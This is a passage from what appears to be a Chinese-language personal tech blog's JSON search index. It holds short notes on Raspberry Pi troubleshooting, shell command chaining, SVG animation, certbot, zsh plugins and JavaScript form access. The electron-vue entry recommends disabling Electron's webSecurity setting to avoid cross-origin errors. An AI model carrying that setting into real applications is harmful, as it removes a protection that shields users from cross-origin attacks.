不是辦法\n所以買一個USB To TTL這個東西跟Raspberry PI 連接\n\n<!--more-->\n\n首先，[USB To TTL | Raspberry Pi台灣樹莓派](https://www.raspberrypi.com.tw/tag/usb-to-ttl/)\n基本上照上面做就可以連接到了\n\n不過...，不知到插上去的位置\n[RPi Low-level peripherals - eLinux.org](https://elinux.org/Rpi_Low-level_peripherals#General_Purpose_Input.2FOutput_.28GPIO.29)\n照上面對照GPIO就不會插錯了\n\n也有發現用網路線連接方法[1.6 直接 連接到 另外一部電腦(用網路線) - 學習樹莓派--Raspberry Pi](https://sites.google.com/site/raspberypishare0918/home/di-yi-ci-qi-dong/zhi-jie-lian-bi-dian)\n不過也懶的插來插去\n買個TTL預防萬一\n\n結果網路問題`ifdown eth0`再`ifup eth0` 就能work了....\n不知道是DHCP問題還是樹莓派問題...\n還要先繼續觀查...\n","tags":["TTL"],"categories":["Linux"]},{"title":"動畫特效繪制框架(Sketch.js)","url":"%2Fblog%2F2018%2F03%2F29%2Flogdown%2F2018-03-29-7072140%2F","content":"Sketch.js\n\n最近看到[TVアニメ『LOST SONG』](http://lost-song.com/)網站還滿酷的\n所以研究了一下，發現是使用[sketch.js](http://soulwire.github.io/sketch.js/)\n\n本來想說是很復雜的東西\n結果看了一下，發現是用官網範例[Plasmatic Isosurface](http://soulwire.github.io/Plasmatic-Isosurface/)\n好像把`dat.ui`拿掉就跑出上面樣子\n\n插點看WebGL那邊去了XD\n不過發現圖象矩陣，感覺也是一門大~~坑~~學問\n\n[TVアニメ『LOST SONG』](http://lost-song.com/)\n[sketch.js](http://soulwire.github.io/sketch.js/)\n[2018鐵人賽索引和心得(圖多慎入) - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10197789)\n[Plasmatic Isosurface](http://soulwire.github.io/Plasmatic-Isosurface/)\n[WebGL 技术储备指南 | Taobao FED | 淘宝前端团队](http://taobaofed.org/blog/2015/12/21/webgl-handbook/)\n[soulwire/Plasmatic-Isosurface: A 2 dimensional plasma simulation running on the GPU, written in GLSL and CoffeeScript and rendered with WebGL.](https://github.com/soulwire/Plasmatic-Isosurface)\n\n矩陣\n* [详解CSS的矩阵变换函数matrix() | 中二病也要玩 front end](https://lfkid.github.io/2016/05/03/%E8%AF%A6%E8%A7%A3CSS%E7%9A%84%E7%9F%A9%E9%98%B5%E5%8F%98%E6%8D%A2%E5%87%BD%E6%95%B0matrix/)\n* [【介紹】Geogebra 與線性變換矩陣（1／8）：矩陣變換與圖形 - YouTube](https://www.youtube.com/watch?v=ywmWnccKXDA)\n* [详解CSS的矩阵变换函数matrix() | 中二病也要玩 front end](https://lfkid.github.io/2016/05/03/%E8%AF%A6%E8%A7%A3CSS%E7%9A%84%E7%9F%A9%E9%98%B5%E5%8F%98%E6%8D%A2%E5%87%BD%E6%95%B0matrix/)\n* [CSS3 transform-function matrix 變形矩陣](http://www.eion.com.tw/Blogger/?Pid=1168)\n* [CSS3 matrix双板划水、拉伸、打板动画实例animation-亮术网](http://www.liangshunet.com/ca/201707/793190018.htm)\n* [THE MAGNIFICENT 2D MATRIX](http://ncase.me/matrix/)\n* [如何通过js获取到CSS3里面transform rotate旋转角度的度数，matrix解析 - CSDN博客](https://blog.csdn.net/u010884130/article/details/50005437)\n* [Matrix rain animation using HTML5 canvas and javascript](http://thecodeplayer.com/walkthrough/matrix-rain-animation-html5-canvas-javascript)","tags":["matrix"],"categories":["網頁特效"]},{"title":"連續打指令&& 與;差別","url":"%2Fblog%2F2018%2F03%2F26%2Flogdown%2F2018-03-26-7062187%2F","content":"\n[Solved: cron question about multiple commands - Hewlett Packard Enterprise Community](https://community.hpe.com/t5/System-Administration/cron-question-about-multiple-commands/td-p/3444393)\n```\n\nRe: cron question about multiple commands\n\"echo ; ls\" will execute both echo and ls, whatever is echo exit code.\n\n\"echo && ls\" will execute ls only if echo exit code is 0.\n\nMaybe you should do a script. Complex lines in crontab make it not clear and harder to maintain.\n\nRegards,\n\nFred\n--\n\n\"Reality is just a point of view.\" (P. K. D.)\n\n```\n我有做個小實驗，簡單來講exit code`;`會傳回最後一個\n但是`&&`會兩個看有沒有有沒有成功\n[Imgur](https://i.imgur.com/ei5cDId.png)\n","tags":["Linux"],"categories":["Linux"]},{"title":"開機執行程式(/etc/rc.d/rc.local、Update-rc.d)筆記","url":"%2Fblog%2F2018%2F03%2F26%2Flogdown%2F2018-03-26-7060577%2F","content":"最近玩linux用到...\n不過還沒實作過\n因為要做logdown移轉動作\n先筆記存檔一下\n\n\n* [Ubuntu 16.04设置rc.local开机启动命令/脚本的方法_Linux教程_Linux公社-Linux系统门户网站](https://www.linuxidc.com/Linux/2017-09/147166.htm)\n* [Update-rc.d && rc.local管理Ubuntu的开机启动 - CSDN博客](https://blog.csdn.net/wzy_1988/article/details/8476901)\n* [fecbob.pixnet.net/blog/post/39347095-linux%E9%96%8B%E6%A9%9F%E8%87%AA%E5%8B%95%E5%95%9F%E5%8B%95](http://fecbob.pixnet.net/blog/post/39347095-linux%E9%96%8B%E6%A9%9F%E8%87%AA%E5%8B%95%E5%95%9F%E5%8B%95)\n\ncentos\n[在CentOS下配置自启动服务 | 王超的技术博客](http://imchao.wang/2014/02/21/make-your-service-autostart-on-linux/)","tags":["update-rc.d"],"categories":["Linux"]},{"title":"Raspberry pi 遇到emergency mode問題","url":"%2Fblog%2F2018%2F03%2F26%2Flogdown%2F2018-03-26-7060547%2F","content":"很奇怪...今天Raspberry pi 開機遇到emergency mode\n```\nWelcome to emergency mode! After logging in, type \"journalctl -xb\" to view\nsystem logs, \"systemctl reboot\" to reboot, \"systemctl default\" to try again\nto boot into default mode.\nGive root password for maintenance\n(or type Control-D to continue):\n```\n平常沒有用鍵盤USB，剛好最近買一個機械式鍵盤剛好是USB\n剛好可以插在上面，原本還滿擔心可能不能用的問題\n好險沒有\n\n<!--more-->\n\n\n按Enter竟然可以進去桌面\n(可能在系統升級跑到桌面設定)\n後來`rasp-config`把console設定回來\n難怪升級之後，覺得開機有比較慢XD\n\n`/etc/fstab`我也沒有加什麼東西上去...\n\n於是我`fsck /dev/mmcblk0p2`修壞軌就能開機了\n\n不過接hdmi發現右上角有閃電符號...\n我原本以為是不是充電...\n[树莓派屏幕右上角闪电符号是什么意思_树莓派吧_百度贴吧](http://tieba.baidu.com/p/4822934770)\n查詢結果是電壓不足....\n\n不過後來有把鍵盤+滑鼠USB 拿掉就沒有顯示出來\n可以機械式鍵盤上面的燈太耗電了吧XD\n\n希望不要再壞一次了\n\n參考來源：\n[ubuntu 进入 emergency mode 解决 – 累不死的牛](http://www.noinf.com/?p=273)\n[阿就操場啊~: Linux開機進入emergency mode](https://2formosa.blogspot.com/2018/01/linuxe-mergency-mode-when-booting.html)","tags":["Raspberry PI"],"categories":["Linux"]},{"title":"css的小箭頭原理","url":"%2Fblog%2F2018%2F03%2F25%2Flogdown%2F2018-03-25-7057276%2F","content":"因為要做blog轉移，所以我就簡單的說明...\n[CSS的小箭頭 | 前端，沒有極限](https://wcc723.github.io/css/2013/09/04/css-arrow/)\n上面說得很清楚，是用border繪制出來的\n在把其他地方沒用到border顏色改成`transparent `\n只不過從來沒有想過border可以這樣運用\n\n\n參考來源：\n[cssarrowplease](http://www.cssarrowplease.com/)\n[CSS的小箭頭 | 前端，沒有極限](https://wcc723.github.io/css/2013/09/04/css-arrow/)","tags":["CSS"],"categories":["網頁特效"]},{"title":"svg畫邊特效","url":"%2Fblog%2F2018%2F03%2F25%2Flogdown%2F2018-03-25-7057242%2F","content":"# 例用CSS ANIMTION畫邊框\nhttps://jsbin.com/huteruhopa/edit?html,css,output\n上面例用CSS Animation做繪制邊框、填色動作\n參考了[CSS + SVG stroke 動態描繪 | 前端，沒有極限](https://wcc723.github.io/svg/2014/06/15/svg-css-stroke-animation/)\n\n[SVG 研究之路 (6) - stroke 邊框 - OXXO.STUDIO](http://www.oxxostudio.tw/articles/201406/svg-06-stroke.html)\n\n<!--more-->\n\n\n## stroke-dasharray 虛線\n> Value: none | < dasharray> | inherit\n[stroke-dasharray - SVG | MDN](https://developer.mozilla.org/en-US/docs/Web/SVG/Attribute/stroke-dasharray)\n\n ## 什麼是 dasharray?\n > stroke-dasharray是把stroke做成了是虛線的效果，線段會被拆成**線段、空白、線段、空白**\n 原本這句看不是很懂，但是從實側做一下\n 就是 線段長度{1} 空白{0,1}\n 當只有一個數字\n 線段、空白都會設為一樣長度(有點像margin、padding)\n 當然也可以設定不一樣\n `100 20 30 20`\n>‘stroke-dasharray’ controls the pattern of dashes and gaps used to stroke paths. <dasharray> contains a list of comma and/or white space separated <length>s and <percentage>s that specify the lengths of alternating dashes and gaps. If an odd number of values is provided, then the list of values is repeated to yield an even number of values. Thus, stroke-dasharray: 5,3,2 is equivalent to stroke-dasharray: 5,3,2,5,3,2.\n[Painting: Filling, Stroking and Marker Symbols – SVG 1.1 (Second Edition)](https://www.w3.org/TR/SVG11/painting.html#StrokeDashoffsetProperty)\n\n## 原理\n\n好了，知道這樣還是沒法知道為什麼可以連線過去\n\n> stroke-dashoffset屬性是將上面的虛線推移，兩者會有以下幾點特性：\n>    推移後，dasharray還是會保持循環。\n>    dashoffset的值不會大於dasharray。\n>    如果dashoffset 等於 dasharray，線段起始點會是空白。\n\n這當出原理看不是很了解\n原來線長度是dasharray把**線段、空白**設定一樣長度\n然後對dashoffset做位移動作\n例如：\nsvg裡的line 500\ndasharray線段500空白500\n當你做dashoffset\n自然而然沒有線，不過dashoffset超過500以上就會跑出來了\n!!!!等等那不是就沒法做到畫線方法!!!!\n但只要再把dasharray跟dashoffset設定2000\n只要大於你的邊線長度就沒有問題了\n知道原理真的豁然開朗XD\n\n\nhttps://jsbin.com/duhudisifi/edit?html,css,output\n小小的改造成慢慢消失\n\n\n# vivus.js\n在網路上爬到[HTML5 SVG图形轮廓线条绘制动画插件-vivus_jQuery之家-自由分享jQuery、html5、css3的插件库](http://www.htmleaf.com/html5/SVG/201501261279.html)\n有中文翻譯...，果然有中文我才能吸收  orz\n>下面是一些你在使用SVG文件时需要注意的问题：\n*  SVG必须以内联的方式放置在HTML文件中，另外不能使用javascript来操控它。\n*    所有的元素都必须有stroke属性而且不能填充图形。因为插件只是绘制图形的轮廓而不会去检查它的颜色。例如：fill: \"none\"; ，stroke: \"#FFF\";。\n*    你应该避免创建隐藏的SVG元素。Vivus会在执行动画前过滤掉一些不合格的元素。如果隐藏SVG没有被过滤掉，在执行路径动画时将会出现一些空白区域和缝隙。\n*    不允许使用text元素，它们不能被转换为path元素。\n\n[TVアニメ「ノラと皇女と野良猫ハート」公式サイト](http://nora-anime.net/)\n左上角的logo是用兩個svg作處理\n我原本以為那個vivus.js有做填色效果....\n結果後來發現有兩個svg    orz\n\n\n這兩個方法差別一個是用css，另一個是用js\n但原理都相同...\n所以把[TVアニメ「ノラと皇女と野良猫ハート」公式サイト](http://nora-anime.net/)完整SVG\n用到https://jsbin.com/huteruhopa/edit?html,css,output\n改一下CSS的class  .cls-2\n哈    也是可以用XD\n\n\n```javascript\n\t\t\tvar hi = new Vivus('hi-there', {duration:  500} ,function () {\n\t\t\t\t\tif (window.console) {\n\t\t\t\t\t\tconsole.log('Animation finished. [log triggered from callback]');\n\t\t\t\t\t}\n\t\t\t\t});\n\n\n ```\n\n\n然後這篇文章我放著多天...\n終於補完了...\n\n\n\n參考來源：\nhttps://maxwellito.github.io/vivus/\nhttp://nora-anime.net/\n[CSS + SVG stroke 動態描繪 | 前端，沒有極限](https://wcc723.github.io/svg/2014/06/15/svg-css-stroke-animation/)\n[SVG 研究之路 (6) - stroke 邊框 - OXXO.STUDIO](http://www.oxxostudio.tw/articles/201406/svg-06-stroke.html)\n[一个封装了vivus的vue组件，能够播放svg路径动画 - JavaScript开发社区 | CTOLib码库](http://java.ctolib.com/NBSeven-vue-svg-draw.html)\n[10 个非常有用的 SVG 动画的 JavaScript 库 - 简书](https://www.jianshu.com/p/20bfeda0ba3b)\n[Vivus js](https://codepen.io/creotip/pen/JodMVL)","tags":["SVG"],"categories":["網頁特效"]},{"title":"終端機錄制工具 asciinema","url":"%2Fblog%2F2018%2F03%2F25%2Flogdown%2F2018-03-25-terminal-recording-tool-asciinema%2F","content":"最近想記錄我在筆電上面的終端機設定\n但以經放著多天，最近在最有空的時候準備整理一下\n本來想用圖片整理，但logdown不能上傳圖片\n未來會考慮用hexo來用...\n\n不過在用hexo之後，剛好看到asciinema可以錄制command指令\n想說先用這個東西來試試\n\n<!--more-->\n\n官方網站有介紹[Getting started - asciinema](https://asciinema.org/docs/getting-started)安裝步驟\n不過...試過`sudo apt-get install asciinema`\n在錄制的時候在upload會說版本太舊...\n\n想說用pip3應該就不會有問題\n沒想到我電腦沒有pip3\n```\n#安裝pip3\nsudo apt-get install python3-pip\n#安裝pip\nsudo apt-get install python-pip\n```\n\n沒想到在做`sudo pip3 install asciinema`\n竟然跳出pip版本問題...\n```\npip3 install --upgrade pip\n```\n\n再執行\n```\nsudo pip3 install asciinema\n```\n可以順利安裝\n\n## asciinema rec [filename]\n錄制開始，結束會問要不要上傳\n## asciinema play [filename]\n播放\n##  asciinema cat [filename]\n查看顯示結果\n## asciinema  upload  [filename]\n上傳到asciinema網站上面\n\n錄制結果如下\n[![asciicast](https://asciinema.org/a/kLj4j7cwjwsUnrIvTM3GZ9VtC.png)](https://asciinema.org/a/kLj4j7cwjwsUnrIvTM3GZ9VtC)\n\n參考來源：\n[升级pip3的正确姿势 - 简书](https://www.jianshu.com/p/34235f5d484a)","tags":["asciinema"],"categories":["實用工具"]},{"title":"Certbot更新憑證失敗記錄","url":"%2Fblog%2F2018%2F03%2F03%2Flogdown%2F2018-03-03-6672669%2F","content":"之前有做TSL加密自動化憑證\n但是遇到一些問題\n例否我更新Linux導至Certbot壞掉\n但重安裝Certbot就沒有這個問題\n\n除了我有設定防火牆問題\n但還是失敗\n不過最後還是找到原因，記錄一下\n\n<!--more-->\n\n更新完套件，指令換成了`certbot`\n但用法還是大同小異\n不過還是更新失敗了\n\n首先手動執行\n```\n.certbot renew --dry-run\n```\n查看有什麼錯誤資訊\n\n```\n-------------------------------------------------------------------------------\nProcessing /etc/letsencrypt/renewal/zhukun.net.conf\n-------------------------------------------------------------------------------\nCert not yet due for renewal\n\nThe following certs are not due for renewal yet:\n  /etc/letsencrypt/live/zhukun.net/fullchain.pem (skipped)\nNo renewals were attempted.\n```\n有遇到正常的log\n但看瀏覽器幫很正常...\n後來爬文，原來要重啟apache...\n\n有看到用hook-post方法\n`certbot renew --post-hook \"service httpd restart\"`\n\n\n不知道reload會不會就可以了\n只能等下次5月更新才知道\n\n\n\n\n* [启用Let’s Encrypt的免费SSL证书 | 月与灯依旧](https://www.zhukun.net/archives/8104)\n* [Let's Encrypt SSL安装出现问题 - Linux面板 - 宝塔面板论坛](https://www.bt.cn/bbs/thread-7179-1-1.html)\n* [letsencrypt 工具改成 certbot 了 | 壞蛋的密室](https://www.pigo.idv.tw/archives/3150)\n* [通过Certbot配置Let's Encrypt的SSL（Apache） | StringBlog](https://stringblog.com/%E9%80%9A%E8%BF%87certbot%E9%85%8D%E7%BD%AElets-encrypt%E7%9A%84ssl%EF%BC%88apache%EF%BC%89/)","tags":["certbot"],"categories":["Apache"]},{"title":"超級終端機 enhancd","url":"%2Fblog%2F2018%2F01%2F22%2Flogdown%2F2018-01-22-super-terminal-enhancd%2F","content":"enhancd有點像sublime text功能一樣\n可快速選到你要的檔案\n但他好像是抓取你進去過的目錄\n沒進去可能無法抓到\n\n用講的很難理解，看影片比較快XD\n[![asciicast](https://asciinema.org/a/RPKiErqRYCGKIGfpDuvm0safe.png)](https://asciinema.org/a/RPKiErqRYCGKIGfpDuvm0safe)\n[URL](https://asciinema.org/a/RPKiErqRYCGKIGfpDuvm0safe)\n\n[b4b4r07/enhancd: A next-generation cd command with an interactive filter](https://github.com/b4b4r07/enhancd)","tags":["zplug"],"categories":["Linux"]},{"title":"超級終端機 fzy","url":"%2Fblog%2F2018%2F01%2F22%2Flogdown%2F2018-01-22-super-terminal-fzy%2F","content":"網路上看到fzy工具\n感覺在選擇多個檔案會很有幫助\n<!--more-->\n\n```\nzplug \"jhawthorn/fzy\", \\\n    as:command, \\\n    rename-to:fzy, \\\n    hook-build:\"\n    {\n        make\n        sudo make install\n    } &>/dev/null\n    \"\n    ```\n\n    [![asciicast](https://asciinema.org/a/TNkbpJmduO878wMUsr6iyobxF.png)](https://asciinema.org/a/TNkbpJmduO878wMUsr6iyobxF)","tags":["zplug"],"categories":["Linux"]},{"title":"超級終端機 fzf","url":"%2Fblog%2F2018%2F01%2F22%2Flogdown%2F2018-01-22-5198700%2F","content":"感覺就是fzy的進階版\n他可以多選`fzy -m`，按`tab`可做選擇動作\n官網其中範例\n```\nfind * -type f | fzf > selected\n```\n其實還有滿多vim範例的\n但我都不太熟 哈\n\n```\nfzf --preview 'cat {}'\n```\n這個預覽工能也滿強大的XD\n\n\n參考來源：\n[模糊搜索神器fzf - 验证的进阶之路 - SegmentFault 思否](https://segmentfault.com/a/1190000011328080)\n[junegunn/fzf: A command-line fuzzy finder](https://github.com/junegunn/fzf)\n[模糊搜索神器fzf - 掃文資訊](https://hk.saowen.com/a/119630d800b375b1e3186e8c19efac8b5e4d29b0e3b712d036ea3aa02ffbfc7f)","tags":["zplug"],"categories":["Linux"]},{"title":"超級終端機 bd","url":"%2Fblog%2F2018%2F01%2F22%2Flogdown%2F2018-01-22-super-terminal-bd%2F","content":"常常因為要做`cd ../..`而煩腦嗎\n發現有人介紹zplug其中一個套件 bd\n這指令跟bd是相反的\n\nzplug 安裝方法\n```\nzplug \"tarrasch/zsh-bd\", at:3724233, frozen:1\n```\n\n[![asciicast](https://asciinema.org/a/9HZ5Pkigj34EvGUwQOshH5ddK.png)](https://asciinema.org/a/9HZ5Pkigj34EvGUwQOshH5ddK)\n[URL](https://asciinema.org/a/9HZ5Pkigj34EvGUwQOshH5ddK)","tags":["zplug"],"categories":["Linux"]},{"title":"超級終端機 指令補全","url":"%2Fblog%2F2018%2F01%2F22%2Flogdown%2F2018-01-22-super-terminal-command-completion%2F","content":"oh-my-zsh有一個指令補全功能\n再我裝zsh在elementary OS 上面少這個功能\n就不太習慣XD\n\n好來我找到了\n\n在[oh-my-zsh/completion.zsh at master · robbyrussell/oh-my-zsh](https://github.com/robbyrussell/oh-my-zsh/blob/master/lib/completion.zsh)抓下來(檔案抓下來，對照設定檔錄徑)\n.zshrc設定\n```\n#　TAB 補完選單\nsource ~/.zplug/completion.zsh\n```\n就能完成了\n\n![asciicast](https://asciinema.org/a/kLj4j7cwjwsUnrIvTM3GZ9VtC.png)\n[URL](https://asciinema.org/a/kLj4j7cwjwsUnrIvTM3GZ9VtC)\n\n[oh-my-zsh/completion.zsh at master · robbyrussell/oh-my-zsh](https://github.com/robbyrussell/oh-my-zsh/blob/master/lib/completion.zsh)\n[Installing zsh-autosuggestions - asciinema](https://asciinema.org/a/37390)\n\n\n","tags":["zplug"],"categories":["Linux"]},{"title":"超級終端機 zplug","url":"%2Fblog%2F2018%2F01%2F22%2Flogdown%2F2018-01-22-5198665%2F","content":"[[2018 鐵人賽] 簡潔高效的 PHP & Laravel 工作術：從 elementary OS 下手的聰明改造提案 #11](https://medium.com/@shengyou/2018ironman-eos-for-php-developer-day11-dff7e9b47679)\n```\nsource ~/.zplug/init.zsh\n#　TAB 補完選單\nsource ~/.zplug/completion.zsh\n\n\n\n\nexport DEFAULT_USER=`whoami`\n\nPOWERLEVEL9K_LEFT_PROMPT_ELEMENTS=(dir newline vcs)\nzplug \"bhilburn/powerlevel9k\", use:powerlevel9k.zsh-theme\n\n# 排序安裝\nzplug \"zsh-users/zsh-syntax-highlighting\", defer:2\n\n\n# 從 Github 安裝\nzplug \"zsh-users/zsh-history-substring-search\"\n\n# 從 on-my-zsh 安裝\nzplug \"plugins/git\", from:oh-my-zsh\n\n\n# 依作業系統載入\nzplug \"lib/clipboard\", from:oh-my-zsh, if:\"[[ $OSTYPE == *darwin* ]]\"\n\n#docker compose\nzplug \"plugins/docker-compose\", from:oh-my-zsh\n\nzplug \"b4b4r07/enhancd\", use:init.sh\n\nzplug \"tarrasch/zsh-bd\", at:3724233, frozen:1\n\nzplug \"jhawthorn/fzy\", \\\n    as:command, \\\n    rename-to:fzy, \\\n    hook-build:\"\n    {\n        make\n        sudo make install\n    } &>/dev/null\n    \"\n\nzplug \"junegunn/fzf-bin\", as:command, from:gh-r, rename-to:fzf\n\n# ついでに tmux 用の拡張も入れるといい\nzplug \"junegunn/fzf\", as:command, use:bin/fzf-tmux\n\n\nif ! zplug check --verbose; then\n    printf \"Install? [y/N]: \"\n    if read -q; then\n        echo; zplug install\n    fi\nfi\n\n\n\n#沒有用\n#POWERLEVEL9K_MODE=\"Hack\"\n\nzplug load\n\n```\n\n\n# 解決`zplug install` unknow error\n安裝gawk\n`sudo apt-get install gawk`","tags":["zplug"],"categories":["Linux"]},{"title":"vue-electron測試使用初體驗","url":"%2Fblog%2F2018%2F01%2F20%2Flogdown%2F2018-01-20-5134612%2F","content":"最近剛好看到vue-electron\n剛好手頭想做一個桌面程式\n就想嘗試看看\n\n```sh\n# 安装 vue-cli 和 脚手架样板代码\nnpm install -g vue-cli\nvue init simulatedgreg/electron-vue my-project\n\n# 安装依赖并运行你的程序\ncd my-project\nnpm install\nnpm run dev\n```\n先不要安裝es-lint\n\n打開Visual Studio Code就可以改程式\n而且存檔都會自動重新載入\n\n剛開始試著改程式，都沒辦法載入成功\n後來是發現es-lint不要安裝\n就不會有問題了\n\n連編譯exe設定都幫你設定好了\n這真的太棒了\n```\nnpm run build\n```\n\n目前有用簡單功能，有做ajax動作\n爬文以後，有看到vue-electron內建有axios\naxios可以使用ajax功能\n跨網域預設還是會擋的\n在`main/index.js`設定`webPreferences: { webSecurity: false }`\n```\n  mainWindow = new BrowserWindow({\n    height: 563,\n    useContentSize: true,\n    width: 1000,\n    webPreferences: { webSecurity: false }\n  });\n  ```\n有做跨網域的問題就可以解決\n\n然後還可以做`熱更新`\n改日再研究\n`Auto Updater`\n\n參考來源\n* [简介 · electron-vue](https://simulatedgreg.gitbooks.io/electron-vue/content/cn/)\n* [axios cros - Google 搜尋](https://www.google.com.tw/search?q=axios+cros&client=firefox-b-ab&dcr=0&lr=lang_zh-TW&sa=X&ved=0ahUKEwir3NOl-ObYAhVIn5QKHUyYAmAQuAEIIw&biw=1920&bih=931)\n* [vue cli+axios踩坑記錄+攔截器使用，代理跨域proxy - 掃文資訊](https://tw.saowen.com/a/a2588e492571db42c9082c9a37ad5cf9b6b951627d58e00ded64ca18885c043a)\n* [vue結合axios使用入門 - IT閱讀](http://www.itread01.com/content/1499661488.html)\n* [vue 使用axios 跨域請求數據的問題 - IT閱讀](http://www.itread01.com/content/1508324169.html)\n* [如何获取前台input file中的文件上传路径？ - 知乎](https://www.zhihu.com/question/35243347)\n* [Using electron-builder · electron-vue](https://simulatedgreg.gitbooks.io/electron-vue/content/en/using-electron-builder.html#auto-updating)\n* [Code Signing · electron-builder](https://www.electron.build/code-signing)","categories":["electron"]},{"title":"有關GET POST 傳輸內容","url":"%2Fblog%2F2018%2F01%2F15%2Flogdown%2F2018-01-15-4769997%2F","content":"一直以來我以為GET POST都有長度限制...\n但看了下面文章，發現不是這一回事...\n本來要做實驗，最近要做blog搬移\n有空再寫一篇文章\n\n[淺談 HTTP Method：表單中的 GET 與 POST 有什麼差別？ - Soul & Shell Blog](https://blog.toright.com/posts/1203/%E6%B7%BA%E8%AB%87-http-method%EF%BC%9A%E8%A1%A8%E5%96%AE%E4%B8%AD%E7%9A%84-get-%E8%88%87-post-%E6%9C%89%E4%BB%80%E9%BA%BC%E5%B7%AE%E5%88%A5%EF%BC%9F.html)\n[【HTTP】GET传参最大长度的理解误区 - 简书](https://www.jianshu.com/p/512389822f8b)\n[圖解HTTPS、GET和POST - 壹讀](https://read01.com/zh-tw/ozD3PK.html)\n"},{"title":"[JS]為什麼能用document.form1.username呢?","url":"%2Fblog%2F2018%2F01%2F15%2Flogdown%2F2018-01-15-4769676%2F","content":"為什麼能用document.form1.username這個東西?\n\n這個困擾我很久...，在這公司這幾年\n常常看到舊的code，從不解用成習慣\n同事也不知道為什麼，古早人都是這樣寫\n之前有找，但沒有找到相關資訊...\n今天花一些時間找到資料，終於找到為什麼\n\n平常見網路教使用`document.form1.elements['username']`或`document.forms['form1'].elements['uername']`.\n公司常見寫法`document.form1.username`，只知道form1是用name不是用id去命名的\n一直思考到今日，我又繼續查\n\n<!--more-->\n\n# JavaScript Properties\n\n今天爬到[物件的使用 - JavaScript | MDN](https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Guide/Working_with_Objects#%E7%B5%A6%E7%89%A9%E4%BB%B6%E5%B1%AC%E4%BB%B6%E7%B7%A8%E7%B4%A2%E5%BC%95)這篇\n\n>The exception to this rule is objects reflected from HTML, such as the forms array. You can always refer to objects in these arrays by either their ordinal number (based on where they appear in the document) or their name (if defined). For example, if the second <FORM> tag in a document has a NAME attribute of \"myForm\", you can refer to the form as document.forms[1] or document.forms[\"myForm\"] or document.myForm.\n\n當下嘗試寫下面code\n```\nvar a = [];\na['length'];\n//return 0\n//常見的a.length\n```\n竟然能work\n\n看到這篇我晃然大悟...\n## 今天我終於還債了，開心:D\n\n\n### 簡單深入了解\n`document.forms`傳回[HTMLCollection](https://developer.mozilla.org/zh-TW/docs/Web/API/HTMLCollection)東西\nHTMLCollection在W3C文件可以看見\n>element = collection[name]\n    Returns the first element with ID or name name from the collection.\n\n[DOM Standard](https://dom.spec.whatwg.org/#htmlcollection)\n\n所以`document.forms.(name)`跟`document.forms.(id)`都可以抓到\n\n做到這邊我發現怪怪的...\n`document.(form1)`怎麼可以抓到name，但不能抓到ID\n不過先排除HTMLCollection一樣問題\n\n直接找W3C文件Document文件[Named elements](https://html.spec.whatwg.org/multipage/dom.html#dom-document-nameditem-filter)\n\n> 1. Exposed embed, form, iframe, img, or exposed object elements that have a name content attribute whose value is name, or\n\n> 2. Exposed object elements that have an id content attribute whose value is name, or\n\n> 3. img elements that have an id content attribute whose value is name, and that have a non-empty name content attribute present also.\n\n> 4. An embed or object element is said to be exposed if it has no exposed object ancestor, and, for object elements, is additionally either not showing its fallback content or has no object or embed descendants.\n\n看了文件驚呆了，原來不是只有name會抓，object的id也會抓，還有img有id跟name的時候，才會在`document.(id)`出現\n*WTF*這什麼鬼?! 不過文件規定是這樣應該就沒錯了...，不知道這樣設計是運用在什麼地方\n至少不會再踩到雷了吧XD\n\n再來是Form文件[HTML Standard](https://html.spec.whatwg.org/multipage/forms.html#dom-form-nameditem)\nid跟name都能吃到，詳細就自己去看\n\n\n### 20180124 發現window也跟document一樣有帶有`屬性`[HTMLCollection]\n難怪平常看到form1，可以正常跑，是因為抓到`window`變數\n突然恍然大悟，window.(id)可以抓到我設定的<input id=(id)>\n\n\n\n----\n\n## BTW\n\n其實找超久的，原本從MDN裡的document,form手冊看\n沒有看到我要的，我又從W3C找有沒有相關內容\n結果還是沒有...，不過好在爬到MDN[物件的使用 - JavaScript | MDN](https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Guide/Working_with_Objects#%E7%B5%A6%E7%89%A9%E4%BB%B6%E5%B1%AC%E4%BB%B6%E7%B7%A8%E7%B4%A2%E5%BC%95)這篇\n為什麼許多教學文不會教`document.form1.username`?\n### 因為這都是JavaScript裡基礎的東西\n看到都快要去跪鍵盤了orz\n\n參考來源：\n[JavaScript Properties](https://www.w3schools.com/js/js_properties.asp)\n[HTMLCollection - Web APIs | MDN](https://developer.mozilla.org/zh-TW/docs/Web/API/HTMLCollection)\n[[筆記]用javascript來取得表單元素內容的值(javascript取值) ~ PJCHENder<br>那些沒告訴你的小細節](https://pjchender.blogspot.com/2015/11/javascript.html)","tags":["JavaScript"],"categories":["JavaScript"]},{"title":"Docker權限問題","url":"%2Fblog%2F2018%2F01%2F14%2Flogdown%2F2018-01-14-docker-permission-issues%2F","content":"要做blog移轉，筆記先存檔...\n[docker 容器挂载目录权限问题](http://www.jdkhome.com/article/docker-%E5%AE%B9%E5%99%A8%E6%8C%82%E8%BD%BD%E7%9B%AE%E5%BD%95%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98)\n[docker data volume vs mounted host directory - Stack Overflow](https://stackoverflow.com/questions/34357252/docker-data-volume-vs-mounted-host-directory)","tags":["Docker"],"categories":["Docker"]},{"title":"Docker排程","url":"%2Fblog%2F2018%2F01%2F14%2Flogdown%2F2018-01-14-docker-schedule%2F","content":"要做blog移轉，筆記先存檔...\n\n[在 docker 中執行需要環境變數的 cron job « 少年沒帶腦](http://gaga5lala.logdown.com/posts/2016/12/21/run-crontab-with-environment-variables-in-docker)\n[Python寫的Crontab替代品，支持Docker - 每日頭條](https://kknews.cc/zh-tw/news/3mvvx6y.html)\n[Scheduling tasks with cron on Docker – Jon Ribeiro](https://jonathas.com/scheduling-tasks-with-cron-on-docker/)\n[艦長，你有事嗎？: 在 Synology NAS 上用 docker 運行 php-cli](http://blog.chengweichen.com/2015/11/synology-nas-x-docker-x-php-cli-cron-x.html)","tags":["排程"],"categories":["Docker"]},{"title":"Docker時間同步(校正)","url":"%2Fblog%2F2018%2F01%2F14%2Flogdown%2F2018-01-14-docker-time-synchronization-correction%2F","content":"要做blog移轉，筆記先存檔...\n[Docker容器时间同步问题 - DockOne.io](http://dockone.io/question/505)","tags":["Docker"],"categories":["Docker"]},{"title":"docker 